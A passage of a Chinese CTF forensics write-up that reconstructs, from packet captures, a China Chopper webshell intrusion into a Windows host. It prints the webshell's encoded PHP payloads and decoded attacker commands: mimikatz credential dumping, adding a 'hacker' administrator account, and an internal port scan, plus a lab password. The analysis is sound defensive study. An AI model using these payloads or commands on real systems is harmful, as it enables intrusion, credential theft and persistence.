class="hljs-string">Edition</span> <span class="hljs-string">Service</span> <span class="hljs-string">Pack</span> <span class="hljs-number">2</span><span class="hljs-string">)</span> <span class="hljs-string">i586(SYSTEM)|&lt;-</span><br></code></pre></td></tr></table></figure><p>可知 <code>192.168.1.74</code> 是一台<code>Windows</code>主机，主机名为 <code>TEST-7E28AF8836</code></p><p><code>No.482132-No.482136</code></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">ge<span class="hljs-operator">=</span><span class="hljs-meta">@eval</span>(<span class="hljs-comment">/*12345*/</span>base64_decode(<span class="hljs-variable">$_POST</span>[z0]));<br><span class="hljs-operator">&amp;</span>z0<span class="hljs-operator">=</span><span class="hljs-type">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0</span><span class="hljs-operator">+</span>fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7<br><span class="hljs-meta">@ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>);<span class="hljs-meta">@set_time_limit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">@set_magic_quotes_runtime</span>(<span class="hljs-number">0</span>);echo(<span class="hljs-string">&quot;-&gt;|&quot;</span>);;<span class="hljs-variable">$D</span><span class="hljs-operator">=</span>base64_decode(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;z1&quot;</span>]);<span class="hljs-variable">$F</span><span class="hljs-operator">=</span><span class="hljs-meta">@opendir</span>(<span class="hljs-variable">$D</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$F</span><span class="hljs-operator">==</span><span class="hljs-type">NULL</span>)&#123;echo(<span class="hljs-string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-variable">$M</span><span class="hljs-operator">=</span><span class="hljs-type">NULL</span>;<span class="hljs-variable">$L</span><span class="hljs-operator">=</span><span class="hljs-type">NULL</span>;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$N</span><span class="hljs-operator">=</span><span class="hljs-meta">@readdir</span>(<span class="hljs-variable">$F</span>))&#123;<span class="hljs-variable">$P</span><span class="hljs-operator">=</span><span class="hljs-variable">$D</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$N</span>;<span class="hljs-variable">$T</span><span class="hljs-operator">=</span><span class="hljs-meta">@date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>,<span class="hljs-meta">@filemtime</span>(<span class="hljs-variable">$P</span>));@<span class="hljs-variable">$E</span><span class="hljs-operator">=</span>substr(base_convert(<span class="hljs-meta">@fileperms</span>(<span class="hljs-variable">$P</span>),<span class="hljs-number">10</span>,<span class="hljs-number">8</span>),<span class="hljs-operator">-</span><span class="hljs-number">4</span>);<span class="hljs-variable">$R</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;<span class="hljs-subst">\t</span>&quot;</span>.<span class="hljs-variable">$T</span>.<span class="hljs-string">&quot;<span class="hljs-subst">\t</span>&quot;</span>.<span class="hljs-meta">@filesize</span>(<span class="hljs-variable">$P</span>).<span class="hljs-string">&quot;<span class="hljs-subst">\t</span>&quot;</span>.<span class="hljs-variable">$E</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-meta">@is_dir</span>(<span class="hljs-variable">$P</span>))<span class="hljs-variable">$M</span><span class="hljs-operator">.=</span><span class="hljs-variable">$N</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$R</span>;<span class="hljs-keyword">else</span> <span class="hljs-variable">$L</span><span class="hljs-operator">.=</span><span class="hljs-variable">$N</span>.<span class="hljs-variable">$R</span>;&#125;echo <span class="hljs-variable">$M</span>.<span class="hljs-variable">$L</span>;<span class="hljs-meta">@closedir</span>(<span class="hljs-variable">$F</span>);&#125;;echo(<span class="hljs-string">&quot;|&lt;-&quot;</span>);die();<br><span class="hljs-operator">&amp;</span>z1<span class="hljs-operator">=</span><span class="hljs-type">QzpcXFdXV1xc</span><br></code></pre></td></tr></table></figure><p>响应</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">C</span>:<span class="hljs-string">\\WWW\\</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/8.png" alt="8"></p><p><code>No.492080-No.492086</code></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">ge=@eval(<span class="hljs-regexp">/*12345*/</span>base64_decode($_POST[z<span class="hljs-number">0</span>]));<br>&amp;z<span class="hljs-number">0</span>=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi<span class="hljs-number">0</span>+fCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRmPSRtP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTtlY2hvKG1rZGlyKCRmKT8iMSI6IjAiKTs7ZWNobygifDwtIik7ZGllKCk7<br>@ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>);@set_time_limit(<span class="hljs-number">0</span>);@set_magic_quotes_runtime(<span class="hljs-number">0</span>);echo(<span class="hljs-string">&quot;-&gt;|&quot;</span>);;$m=get_magic_quotes_gpc();$f=$m?stripslashes($_POST[<span class="hljs-string">&quot;z1&quot;</span>]):$_POST[<span class="hljs-string">&quot;z1&quot;</span>];echo(<span class="hljs-keyword">mkdir</span>($f)?<span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>);;echo(<span class="hljs-string">&quot;|&lt;-&quot;</span>);<span class="hljs-keyword">die</span>();<br>&amp;z1=C:\\WWW\\<span class="hljs-keyword">my</span><br></code></pre></td></tr></table></figure><p>响应</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">-&gt;|<span class="hljs-number">1</span>|&lt;-<br></code></pre></td></tr></table></figure><p>继续打开第三个数据包</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>开头就是菜刀的流量，依次查找<br>可以知道黑客上传了一个<code>tunnel.nosocket.php</code>来做代理。<br>上传了一个<code>scan.php</code>用来扫描。<br>查看了本机的IP地址。</p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/9.png" alt="9"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ge</span>=%<span class="hljs-number">40</span>eval%<span class="hljs-number">28</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>A<span class="hljs-number">12345</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">2</span>Fbase<span class="hljs-number">64</span>_decode%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>Bz<span class="hljs-number">0</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B&amp;z<span class="hljs-number">0</span>=QGluaV<span class="hljs-number">9</span>zZXQoImRpc<span class="hljs-number">3</span>BsYXlfZXJyb<span class="hljs-number">3</span>JzIiwiMCIpO<span class="hljs-number">0</span>BzZXRfdGltZV<span class="hljs-number">9</span>saW<span class="hljs-number">1</span>pdCgwKTtAc<span class="hljs-number">2</span>V<span class="hljs-number">0</span>X<span class="hljs-number">21</span>hZ<span class="hljs-number">2</span>ljX<span class="hljs-number">3</span>F<span class="hljs-number">1</span>b<span class="hljs-number">3</span>Rlc<span class="hljs-number">19</span>ydW<span class="hljs-number">50</span>aW<span class="hljs-number">1</span>lKDApO<span class="hljs-number">2</span>VjaG<span class="hljs-number">8</span>oIi<span class="hljs-number">0</span>%<span class="hljs-number">2</span>BfCIpOzskcD<span class="hljs-number">1</span>iYXNlNjRfZGVjb<span class="hljs-number">2</span>RlKCRfUE<span class="hljs-number">9</span>TVFsiejEiXSk<span class="hljs-number">7</span>JHM<span class="hljs-number">9</span>YmFzZTY<span class="hljs-number">0</span>X<span class="hljs-number">2</span>RlY<span class="hljs-number">29</span>kZSgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbInoyIl<span class="hljs-number">0</span>pOyRkPWRpcm<span class="hljs-number">5</span>hbWUoJF<span class="hljs-number">9</span>TRVJWRVJbIlNDUklQVF<span class="hljs-number">9</span>GSUxFTkFNRSJdKTskYz<span class="hljs-number">1</span>zdWJzdHIoJGQsMCwxKT<span class="hljs-number">09</span>Ii<span class="hljs-number">8</span>iPyItYyBcInskc<span class="hljs-number">31</span>cIiI<span class="hljs-number">6</span>Ii<span class="hljs-number">9</span>jIFwieyRzfVwiIjskcj<span class="hljs-number">0</span>ieyRwfSB<span class="hljs-number">7</span>JGN<span class="hljs-number">9</span>IjtAc<span class="hljs-number">3</span>lzdGVtKCRyLiIgMj<span class="hljs-number">4</span>mMSIsJHJldCk<span class="hljs-number">7</span>cHJpbnQgKCRyZXQhPTApPyIKcmV<span class="hljs-number">0</span>PXskcmV<span class="hljs-number">0</span>fQoiOiIiOztlY<span class="hljs-number">2</span>hvKCJ<span class="hljs-number">8</span>PC<span class="hljs-number">0</span>iKTtkaWUoKTs%<span class="hljs-number">3</span>D&amp;z<span class="hljs-number">1</span>=Y<span class="hljs-number">21</span>k&amp;z<span class="hljs-number">2</span>=Y<span class="hljs-number">2</span>QgL<span class="hljs-number">2</span>QgIkM<span class="hljs-number">6</span>XFdXV<span class="hljs-number">1</span>wiJm<span class="hljs-number">5</span>ldHN<span class="hljs-number">0</span>YXQgLWFubyZlY<span class="hljs-number">2</span>hvIFtTXSZjZCZlY<span class="hljs-number">2</span>hvIFtFXQ%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/10.png" alt="10"></p><p>对执行的命令解码可得黑客执行了<code>netstat -ano</code></p><p>根据题目 允许外连的TCP注册端口 可知为<br><code>1025 3306 3389</code></p><p><code>No.161899</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Form <span class="hljs-built_in">item</span>: <span class="hljs-string">&quot;z2&quot;</span> = <span class="hljs-string">&quot;Y2QgL2QgIkM6XFdXV1xteVxtaW1pXCImbWltaWthdHouZXhlICIicHJpdmlsZWdlOjpkZWJ1ZyIiICIic2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRzIiIgZXhpdCA+PiBsb2cudHh0JmVjaG8gW1NdJmNkJmVjaG8gW0Vd&quot;</span><br></code></pre></td></tr></table></figure><p>解码可得</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">cd /d <span class="hljs-string">&quot;C:\WWW\my\mimi\&quot;</span>&amp;mimikatz.exe <span class="hljs-string">&quot;&quot;</span>privilege::debug<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;&quot;</span>sekurlsa::logonpasswords<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-built_in">log</span>.txt&amp;<span class="hljs-built_in">echo</span> [S]&amp;cd&amp;<span class="hljs-built_in">echo</span> [E]<br></code></pre></td></tr></table></figure><p>黑客将管理员密码保存在文件中。</p><p><code>No.187524-No.187622</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Form <span class="hljs-built_in">item</span>: <span class="hljs-string">&quot;z2&quot;</span> = <span class="hljs-string">&quot;Y2QgL2QgIkM6XFdXV1xteVxtaW1pXCImbmV0IHVzZXIgaGFja2VyIGhhY2tlciAvYWRkJmVjaG8gW1NdJmNkJmVjaG8gW0Vd&quot;</span><br></code></pre></td></tr></table></figure><p>解码得</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> /d <span class="hljs-string">&quot;C:\WWW\my\mimi\&quot;</span>&amp;net user hacker hacker /<span class="hljs-built_in">add</span>&amp;<span class="hljs-keyword">echo</span> [S]&amp;<span class="hljs-keyword">cd</span>&amp;<span class="hljs-keyword">echo</span> [E]<br></code></pre></td></tr></table></figure><p>黑客执行命令添加用户。</p><p><code>No.197634-No.197864</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Form <span class="hljs-built_in">item</span>: <span class="hljs-string">&quot;z2&quot;</span> = <span class="hljs-string">&quot;Y2QgL2QgIkM6XFdXV1xteVxtaW1pXCImbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvciBoYWNrZXIgL2FkZCZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==&quot;</span><br></code></pre></td></tr></table></figure><p>解码得</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> /d <span class="hljs-string">&quot;C:\WWW\my\mimi\&quot;</span>&amp;net localgroup administrator hacker /<span class="hljs-built_in">add</span>&amp;<span class="hljs-keyword">echo</span> [S]&amp;<span class="hljs-keyword">cd</span>&amp;<span class="hljs-keyword">echo</span> [E]<br></code></pre></td></tr></table></figure><p>黑客将用户添加到管理员组。</p><p>上传了<code>mimikatz</code>来抓取管理员密码</p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/11.png" alt="11"></p><p>获得<code>administrator</code>的密码为<code>Simplexue123</code></p><p>执行<code>systeminfo</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ge</span>=%<span class="hljs-number">40</span>eval%<span class="hljs-number">28</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>A<span class="hljs-number">12345</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">2</span>Fbase<span class="hljs-number">64</span>_decode%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>Bz<span class="hljs-number">0</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B&amp;z<span class="hljs-number">0</span>=QGluaV<span class="hljs-number">9</span>zZXQoImRpc<span class="hljs-number">3</span>BsYXlfZXJyb<span class="hljs-number">3</span>JzIiwiMCIpO<span class="hljs-number">0</span>BzZXRfdGltZV<span class="hljs-number">9</span>saW<span class="hljs-number">1</span>pdCgwKTtAc<span class="hljs-number">2</span>V<span class="hljs-number">0</span>X<span class="hljs-number">21</span>hZ<span class="hljs-number">2</span>ljX<span class="hljs-number">3</span>F<span class="hljs-number">1</span>b<span class="hljs-number">3</span>Rlc<span class="hljs-number">19</span>ydW<span class="hljs-number">50</span>aW<span class="hljs-number">1</span>lKDApO<span class="hljs-number">2</span>VjaG<span class="hljs-number">8</span>oIi<span class="hljs-number">0</span>%<span class="hljs-number">2</span>BfCIpOzskcD<span class="hljs-number">1</span>iYXNlNjRfZGVjb<span class="hljs-number">2</span>RlKCRfUE<span class="hljs-number">9</span>TVFsiejEiXSk<span class="hljs-number">7</span>JHM<span class="hljs-number">9</span>YmFzZTY<span class="hljs-number">0</span>X<span class="hljs-number">2</span>RlY<span class="hljs-number">29</span>kZSgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbInoyIl<span class="hljs-number">0</span>pOyRkPWRpcm<span class="hljs-number">5</span>hbWUoJF<span class="hljs-number">9</span>TRVJWRVJbIlNDUklQVF<span class="hljs-number">9</span>GSUxFTkFNRSJdKTskYz<span class="hljs-number">1</span>zdWJzdHIoJGQsMCwxKT<span class="hljs-number">09</span>Ii<span class="hljs-number">8</span>iPyItYyBcInskc<span class="hljs-number">31</span>cIiI<span class="hljs-number">6</span>Ii<span class="hljs-number">9</span>jIFwieyRzfVwiIjskcj<span class="hljs-number">0</span>ieyRwfSB<span class="hljs-number">7</span>JGN<span class="hljs-number">9</span>IjtAc<span class="hljs-number">3</span>lzdGVtKCRyLiIgMj<span class="hljs-number">4</span>mMSIsJHJldCk<span class="hljs-number">7</span>cHJpbnQgKCRyZXQhPTApPyIKcmV<span class="hljs-number">0</span>PXskcmV<span class="hljs-number">0</span>fQoiOiIiOztlY<span class="hljs-number">2</span>hvKCJ<span class="hljs-number">8</span>PC<span class="hljs-number">0</span>iKTtkaWUoKTs%<span class="hljs-number">3</span>D&amp;z<span class="hljs-number">1</span>=Y<span class="hljs-number">21</span>k&amp;z<span class="hljs-number">2</span>=Y<span class="hljs-number">2</span>QgL<span class="hljs-number">2</span>QgIkM<span class="hljs-number">6</span>XFdXV<span class="hljs-number">1</span>wiJnN<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbWluZm<span class="hljs-number">8</span>mZWNobyBbU<span class="hljs-number">10</span>mY<span class="hljs-number">2</span>QmZWNobyBbRV<span class="hljs-number">0</span>%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/12.png" alt="12"><br>可知修补程序 为<code>Q147222</code></p><p>在前面还发现黑客上传了个<code>scan.php</code></p><p>过滤</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">(<span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">74</span>) <span class="hljs-keyword">and</span> http contains <span class="hljs-string">&quot;scan.php&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/13.png" alt="13"></p><p>追踪一下流</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">startip</span>=<span class="hljs-number">192.168.1.1</span>&amp;endip=<span class="hljs-number">192.168.3.255</span>&amp;port=<span class="hljs-number">21</span>%<span class="hljs-number">2</span>C<span class="hljs-number">80</span>%<span class="hljs-number">2</span>C<span class="hljs-number">8080</span>%<span class="hljs-number">2</span>C<span class="hljs-number">8888</span>%<span class="hljs-number">2</span>C<span class="hljs-number">1433</span>%<span class="hljs-number">2</span>C<span class="hljs-number">3306</span>%<span class="hljs-number">2</span>C<span class="hljs-number">6379</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/14.png" alt="14"></p><p>可知存活主机</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.1</span> <span class="hljs-number">80</span>端口开放，推测是网关<br><span class="hljs-number">192.168.1.8</span> <span class="hljs-number">80</span>,端口开放<br><span class="hljs-number">192.168.1.33</span> <span class="hljs-number">3306</span>端口开放<br><span class="hljs-number">192.168.1.74</span>(本机) <span class="hljs-number">80</span>,<span class="hljs-number">3306</span>端口开放<br><span class="hljs-number">192.168.1.159</span> <span class="hljs-number">80</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">3306</span>端口开放<br><span class="hljs-number">192.168.1.169</span> <span class="hljs-number">80</span>,<span class="hljs-number">3306</span>端口开放<br><span class="hljs-number">192.168.1.200</span> <span class="hljs-number">21</span>端口开放<br><span class="hljs-number">192.168.2.1</span> <span class="hljs-number">80</span>端口开放<br><span class="hljs-number">192.168.2.20</span> <span class="hljs-number">80</span>,<span class="hljs-number">3306</span><br><span class="hljs-number">192.168.2.66</span> <span class="hljs-number">80</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">6379</span> 猜测开放redis。。<br><span class="hljs-number">192.168.2.88</span> <span class="hljs-number">21</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3306</span><br><span class="hljs-number">192.168.3.1</span> <span class="hljs-number">80</span><br><span class="hljs-number">192.168.3.6</span> <span class="hljs-number">80</span>,<span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure><p>猜测后续黑客会利用<code>192.168.1.74</code>作为跳板来入侵内网</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.src == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">74</span> <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ip</span>.dst == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst ==  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst ==  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">33</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">159</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst ==  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">169</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">200</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">20</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst ==  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">66</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">88</span><span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">1</span> <span class="hljs-title">||</span> <span class="hljs-built_in">ip</span>.dst == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">6</span>)<br></code></pre></td></tr></table></figure><p>没有什么发现，打开第四个数据包。</p><p>直接使用上述表达式过滤，是对<code>192.168.2.66</code>的目录扫描。可以判断<code>192.168.2.66</code>就是受到攻击的另一台主机。</p><p>修改一下表达式重新过滤下。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;abc.php&quot;</span><br></code></pre></td></tr></table></figure><p>只有几条记录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ge</span>=%<span class="hljs-number">40</span>eval%<span class="hljs-number">28</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>A<span class="hljs-number">12345</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">2</span>Fbase<span class="hljs-number">64</span>_decode%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>Bz<span class="hljs-number">0</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B&amp;z<span class="hljs-number">0</span>=QGluaV<span class="hljs-number">9</span>zZXQoImRpc<span class="hljs-number">3</span>BsYXlfZXJyb<span class="hljs-number">3</span>JzIiwiMCIpO<span class="hljs-number">0</span>BzZXRfdGltZV<span class="hljs-number">9</span>saW<span class="hljs-number">1</span>pdCgwKTtAc<span class="hljs-number">2</span>V<span class="hljs-number">0</span>X<span class="hljs-number">21</span>hZ<span class="hljs-number">2</span>ljX<span class="hljs-number">3</span>F<span class="hljs-number">1</span>b<span class="hljs-number">3</span>Rlc<span class="hljs-number">19</span>ydW<span class="hljs-number">50</span>aW<span class="hljs-number">1</span>lKDApO<span class="hljs-number">2</span>VjaG<span class="hljs-number">8</span>oIi<span class="hljs-number">0</span>%<span class="hljs-number">2</span>BfCIpOzskRj<span class="hljs-number">1</span>iYXNlNjRfZGVjb<span class="hljs-number">2</span>RlKCRfUE<span class="hljs-number">9</span>TVFsiejEiXSk<span class="hljs-number">7</span>JFA<span class="hljs-number">9</span>QGZvcGVuKCRGLCJyIik<span class="hljs-number">7</span>ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk<span class="hljs-number">7</span>QGZjbG<span class="hljs-number">9</span>zZSgkUCk<span class="hljs-number">7</span>O<span class="hljs-number">2</span>VjaG<span class="hljs-number">8</span>oInw<span class="hljs-number">8</span>LSIpO<span class="hljs-number">2</span>RpZSgpOw%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D&amp;z<span class="hljs-number">1</span>=QzpcXFdXV<span class="hljs-number">1</span>xcY<span class="hljs-number">29</span>uZmlnc<span class="hljs-number">1</span>xcY<span class="hljs-number">29</span>uZmlnLnBocA%<span class="hljs-number">3</span>D%<span 